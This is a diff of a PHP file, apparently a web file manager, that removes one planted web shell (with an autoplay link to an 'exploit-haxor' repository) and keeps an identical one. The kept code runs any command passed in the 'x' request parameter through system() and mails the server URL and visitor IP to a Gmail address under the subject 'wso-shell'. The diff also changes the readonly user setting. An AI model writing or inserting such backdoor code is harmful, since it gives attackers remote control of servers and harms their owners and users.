@@ -1,18 +1,4 @@
-<audio autoplay>
-<source src="https://raw.githubusercontent.com/exploit-haxor/webshell/main/x.mp3">
-</audio>
-<?php
-if(isset($_REQUEST['x'])){
-$el=$_REQUEST['x'];
-system($el);
- 
-}
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'malaysia.sender@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
+
 <?php
 if(isset($_REQUEST['x'])){
 $el=$_REQUEST['x'];
@@ -24,9 +10,6 @@ $tujuanmail = 'muhrazky@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
-
-<?php
 //Default Configuration
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
@@ -61,7 +44,7 @@ $auth_users = array(
 // Readonly users
 // e.g. array('users', 'guest', ...)
 $readonly_users = array(
-    'admin'
+    'user'
 );
 
 // Global readonly, including when auth is not being used
